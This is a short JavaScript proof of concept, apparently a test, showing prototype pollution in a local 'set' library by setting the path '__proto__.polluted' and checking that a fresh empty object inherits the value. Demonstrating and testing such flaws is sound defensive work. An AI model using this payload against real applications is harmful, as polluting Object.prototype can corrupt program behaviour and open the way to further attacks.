const set = require('../src');

console.log({}.polluted)
set.set("__proto__.polluted", "Polluted!", {})
console.log({}.polluted)